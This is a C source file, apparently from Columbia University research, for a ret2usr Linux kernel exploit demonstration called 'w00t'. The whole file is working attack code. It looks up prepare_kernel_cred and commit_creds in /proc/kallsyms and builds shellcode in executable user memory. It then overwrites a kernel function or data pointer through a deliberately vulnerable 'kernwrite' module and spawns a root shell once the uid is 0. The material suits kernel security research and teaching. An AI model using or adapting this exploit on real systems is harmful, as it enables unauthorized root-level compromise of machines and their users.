/*
 * Copyright (c) 2014, Columbia University
 * All rights reserved.
 *
 * This software was developed by Vasileios P. Kemerlis <vpk@cs.columbia.edu>
 * at Columbia University, New York, NY, USA, in April 2014.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *   * Neither the name of Columbia University nor the
 *     names of its contributors may be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#include "shellcode.h"

/* unnecessary and boring */
#define __PROG__	"w00t"
#define __EXEC__	"w00t"
#define __VER__		"19042002be"
#define __COPYLEFT__	"Copyright 2014 Columbia University.\nThis is free software; see the source for copying conditions. There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE."
#define __BUGS__	"<vpk@cs.columbia.edu>"

/* constants */
#define SYMNAME_SZ	1024		/* maximum size of symbol name */
#define ALLOC_STEP	1024*4		/* chunk of 4KB */

#if	defined(__i386__)		/* x86 */
#define	ADDR_SZ		16			/* buffer size; 16 bytes */
#define PAGE_OFFSET	0xC0000000UL		/* kernel space */
#elif	defined(__x86_64__)		/* x86-64 */
#define	ADDR_SZ 	32			/* buffer size; 32 bytes */
#define PAGE_OFFSET	0xFFFF880000000000UL	/* kernel space */
#endif

enum {
	MODE_UNSPEC	= -1,			/* unspecified mode	*/
	MODE_FPTR 	= 0,			/* fptr mode		*/
	MODE_DPTR 	= 1,			/* dptr mode		*/
};

/* 
 * template for the data structure that we will tamper
 * (used only when we overwrite a kernel-mapped data pointer)
 */
struct dummy_ops {
	size_t	val;			/* generic field	*/
	ssize_t (*fptr)(void);		/* function pointer	*/
};


/*
 * help
 *
 * display usage information
 */
static void
help(void)
{
	/* usage info */
	fprintf(stdout, "Usage: %s [OPTION]...\n", __EXEC__);
	fprintf(stdout, "Demonstrate ret2usr.\n\n");

	/* options */
	fprintf(stdout,
		"\t-f, --fptr\t\toverwrite a kernel-mapped function pointer\n");
	fprintf(stdout,
		"\t-d, --dptr\t\toverwrite a kernel-mapped data pointer\n");
	fprintf(stdout,
		"\t-p, --paddr=NUM\t\t`prepare_kernel_cred' virtual address\n");
	fprintf(stdout,
		"\t-c, --caddr=NUM\t\t`commit_cred' virtual address\n");
	fprintf(stdout, "\t-h, --help\t\tdisplay this help and exit\n");
	fprintf(stdout,
		"\t-v, --version\t\tprint version information and exit\n\n");

	/* bugs */
	fprintf(stdout, "Report bugs to %s\n", __BUGS__);
} 

/*
 * version
 *
 * display version information
 */
static void
version(void)
{
	/* display version */
	fprintf(stdout, "%s %s\n\n", __PROG__, __VER__);
	/* copyright info */
	fprintf(stdout, "%s\n", __COPYLEFT__); 
}

/* 
 * find a kernel symbol in /proc/kallsyms
 *
 * @name:	the name (string) of a symbol to search for
 * returns:	the address of the symbol (if found) or 0 otherwise
 */
static unsigned long 
get_ksym(char *name)
{
	/* file pointer	*/
	FILE 	*f	= NULL;

	/* helpers 	*/
	char c, sym[SYMNAME_SZ];
	void	 *addr	= NULL;


	/* open /proc/kallsyms */
	if ((f = fopen("/proc/kallsyms", "r")) == NULL)
		/* failed */
		errx(3,
			"[Fail] couldn't open /proc/kallsyms -- %s",
			strerror(errno));

	/* read kallsyms */
	while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
		if (strlen(sym) == strlen(name) &&
				(strncmp(sym, name, strlen(sym)) == 0))
			/* symbol found; return its address */
			break;
		else
			/* symbol not found */
			addr = NULL;

	/* cleanup */
	fclose(f);
	
	/* return the symbol address (or 0)  */
	return (unsigned long)addr;
}

/*
 * ret2usr via function pointer overwrite
 *
 * @psize:	page size
 * @paddr:	`prepare_kernel_cred' address
 * @caddr:	`commit_creds' address	
 */
static void
p0wn_fptr(long psize, unsigned long paddr, unsigned long caddr)
{
	char 	*code		= NULL;	/* shellcode buffer */
	char	saddr[ADDR_SZ];		/* shellcode address as a string */
	int	fd		= -1;	/* file descriptor */
	char	*argv[]		= {"/bin/sh", NULL};	/* rootshell */


	/* allocate ALLOC_STEP bytes in user space */
	if ((code = mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE | PROT_EXEC,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, 
			-1,
			0)) == MAP_FAILED)
		/* failed */
		errx(7,
		"[Fail] couldn't allocate memory -- %s", strerror(errno));

	/* prepare to overwrite a function pointer via `kernwrite' */
	memset(saddr, 0, ADDR_SZ);
	sprintf(saddr, "%#lx", (unsigned long)code);
	
	/* shellcode stitching */
	memcpy(code, shell_tmpl, SHELL_PREFIX);
				code += SHELL_PREFIX;
	memcpy(code, &caddr, sizeof(unsigned));
				code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
				code += SHELL_ADV;
	memcpy(code, &paddr, sizeof(unsigned));
				code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX + SHELL_ADV], SHELL_SUFFIX);
						
	/* verbose */
	fprintf(stdout, "[+] shellcode is at %s\n", saddr);

	/* do it (kernwrite specific) */
	if ((fd = open("/sys/kernel/debug/kernwrite/over_func_ptr",
					O_WRONLY)) == -1)
		errx(8, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/over_func_ptr",
				strerror(errno));
	if (write(fd, saddr, strlen(saddr)) != strlen(saddr))
		errx(8, "[Fail] couldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/over_func_ptr",
				strerror(errno));
	close(fd);

	if ((fd = open("/sys/kernel/debug/kernwrite/invoke_func",
					O_WRONLY)) == -1)
		errx(9, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	if (write(fd, "1", 1) == -1)
		errx(9, "[Fail] couldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	close(fd);
	
	/* check to see if we succeeded */
	if (getuid() == 0) {
		/* verbose */
		fprintf(stderr, "[+] p0wned [^_-]\n");

		/* execute a rootshell */
		execve("/bin/sh", argv, NULL);
	}

	/* l0Ooser */
	fprintf(stderr, "[-] failed to p0wn the machine\n");
}

/*
 * ret2usr via data pointer overwrite
 *
 * @psize:	page size
 * @paddr:	`prepare_kernel_cred' address
 * @caddr:	`commit_creds' address	
 */
static void
p0wn_dptr(long psize, unsigned long paddr, unsigned long caddr)
{
	char 	*code		= NULL;	/* shellcode buffer */
	char	saddr[ADDR_SZ];		/* shellcode address as a string */
	int	fd		= -1;	/* file descriptor */
	struct	dummy_ops dops;		/* tampered-with data structure */
	char	*argv[]	= {"/bin/sh", NULL};	/* rootshell */


	/* allocate ALLOC_STEP bytes in user space */
	if ((code = mmap(NULL,
			ALLOC_STEP,
			PROT_READ | PROT_WRITE | PROT_EXEC,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
			-1,
			0)) == MAP_FAILED)
		/* failed */
		errx(7,
		"[Fail] couldn't allocate memory -- %s", strerror(errno));
	
	/* prepare to overwrite a data pointer via `kernwrite' */
	memset(saddr, 0, ADDR_SZ);
	sprintf(saddr, "%#lx", (unsigned long)code);
	
	/* set the function pointer accordingly (i.e., to the shellcode) */
	dops.fptr = (void *)(code + sizeof(struct dummy_ops));
	memcpy(code, &dops, sizeof(struct dummy_ops));
				code += sizeof(struct dummy_ops);

	/* shellcode stitching */
	memcpy(code, shell_tmpl, SHELL_PREFIX);
				code += SHELL_PREFIX;
	memcpy(code, &caddr, sizeof(unsigned));
				code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
				code += SHELL_ADV;
	memcpy(code, &paddr, sizeof(unsigned));
				code += sizeof(unsigned);
	memcpy(code, &shell_tmpl[SHELL_PREFIX + SHELL_ADV], SHELL_SUFFIX);
						
	/* verbose */
	fprintf(stdout, "[+] tampered-with data stucture is at %s\n", saddr);
	fprintf(stdout, "[+] shellcode is at %p\n", dops.fptr);
	
	/* do it (kernwrite specific) */
	if ((fd = open("/sys/kernel/debug/kernwrite/over_data_ptr",
					O_WRONLY)) == -1)
		errx(8, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/over_data_ptr",
				strerror(errno));
	if (write(fd, saddr, strlen(saddr)) != strlen(saddr))
		errx(8, "[Fail] couldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/over_data_ptr",
				strerror(errno));
	close(fd);
	
	if ((fd = open("/sys/kernel/debug/kernwrite/invoke_func",
					O_WRONLY)) == -1)
		errx(9, "[Fail] couldn't open %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	if (write(fd, "1", 1) == -1)
		errx(9, "[Fail] coudldn't write in %s -- %s",
				"/sys/kernel/debug/kernwrite/invoke_func",
				strerror(errno));
	close(fd);

	/* check to see if we succeeded */
	if (getuid() == 0) {
		/* verbose */
		fprintf(stderr, "[+] p0wned [^_-]\n");

		/* execute a rootshell */
		execve("/bin/sh", argv, NULL);
	}

	/* l0Ooser */
	fprintf(stderr, "[-] failed to p0wn the machine\n");
}

/*
 * w00t
 *
 * demonstrates a ret2usr attack 
 *
 * The exploitation procedure builds upon the following:
 * 	i. a vulnerability that allows overwriting a kernel-level function/data
 * 		pointer with arbitrary user-controlled values (we use the
 * 		`kernwrite' module to inject a vulnerability)
 *
 * @argc:	number of command-line options
 * @argv:	command-line options
 * returns:	0 on success or >=1 on failure
 */
int
main(int argc, char **argv)
{
	int		mode	= MODE_UNSPEC;	/* 0 = fptr, 1 = dptr 	*/
						/* kernel addresses	*/
	unsigned long	paddr	= 0;		/* prepare_kernel_cred 	*/
	unsigned long	caddr	= 0;		/* commit_creds 	*/

	long psize;				/* page size		*/

	/* getopt stuff */
	int opt;				/* option		*/
	int long_opt_indx	= 0;		/* long option index	*/

	/* long options */
	struct option long_options[] = {
		{"fptr",	0, NULL, 'f'},	/* -f / --fptr		*/
		{"dptr",	0, NULL, 'd'},	/* -d / --dptr		*/
		{"paddr",	1, NULL, 'p'},	/* -p / --paddr		*/
		{"caddr",	1, NULL, 'c'},	/* -c / --caddr		*/
		{"help",	0, NULL, 'h'},	/* -h / --help		*/
		{"version",	0, NULL, 'v'},	/* -v / --version	*/
		{NULL,		0, NULL, 0}};	/* terminating item	*/


	/* arguments parsing */
	while ((opt = getopt_long(argc,
				argv,
				":hvfdrp:c:",
				long_options,
				&long_opt_indx)) != -1) {
		switch(opt) {
			case 'f': /* -f / --fptr */
				mode	= MODE_FPTR;
				break;
			case 'd': /* -d / --dptr */
				mode	= MODE_DPTR;
				break;
			case 'p': /* -p / --paddr */
				paddr	= strtoul(optarg, NULL, 0);
				break;
			case 'c': /* -c / --caddr */
				caddr	= strtoul(optarg, NULL, 0);
				break;
			case 'h': /* help */
				help();
				goto done;
				break;	/* not reached */
			case 'v': /* version info */
				version();
				goto done;
				break;	/* not reached */
			case '?': /* illegal option */
				errx(1,
					"[Fail] illegal option -- %s",
					(optind == 0) 		?
					argv[long_opt_indx] 	:
					argv[optind - 1]);
				break;
			case ':': /* missing argument */
				errx(1,
				"[Fail] option requires an argument -- %s",
					(optind == 0) 		?
					argv[long_opt_indx] 	:
					argv[optind - 1]);
				break;
			default: /* not reached */
				break; /* make the compiler happy */
		}
	} 
	
	/* get the page size */
	if ((psize = sysconf(_SC_PAGESIZE)) == -1)
		/* failed */
		errx(2,
			"[Fail] couldn't read page size -- %s",
			strerror(errno));
	
	/* validate arguments */

	/* fptr vs. dptr */
	if (mode == MODE_UNSPEC) {
		/* verbose */
		warnx("[Warn] `mode' was not specified -- using -f (--fptr)");
		/* set mode to fptr */
		mode = MODE_FPTR;
	}
	
	/* address for `prepare_kernel_cred' */
	if ((paddr < PAGE_OFFSET)) {
		/* verbose */
		warnx("[Warn] invalid `prepare_kernel_cred' address -- %#lx",
				paddr);

		/* try to auto-detect it */
		if ((paddr = get_ksym("prepare_kernel_cred")) != 0)
			/* yes! */
			fprintf(stdout,
				"[*] `prepare_kernel_cred' at %#lx\n",
				paddr);
		else
			/* failed */
			errx(3, "[Fail] couldn't determine the address of `prepare_kernel_cred'");
	}
	
	/* address for `commit_creds' */
	if ((caddr < PAGE_OFFSET)) {
		/* verbose */
		warnx("[Warn] invalid `commit_creds' address -- %#lx", caddr);
	
		/* try to auto-detect it */
		if ((caddr = get_ksym("commit_creds")) != 0)
			/* yes! */
			fprintf(stdout,
				"[*] `commit_creds' at %#lx\n", caddr);
		else
			/* failed */
			errx(3, "[Fail] couldn't determine the address of `commit_creds'");
	}
	
	/* differentiate based on the supplied mode */
	switch (mode) {
		case MODE_FPTR:	/* -f / --fptr supplied */
			p0wn_fptr(psize, paddr, caddr);
			break;
		case MODE_DPTR:	/* -d / --dptr supplied */
			p0wn_dptr(psize, paddr, caddr);
			break;
		default:	/* not reached */
			break;	/* make the compiler happy */
	}

done:	/* done; return with success */
	return EXIT_SUCCESS;
}
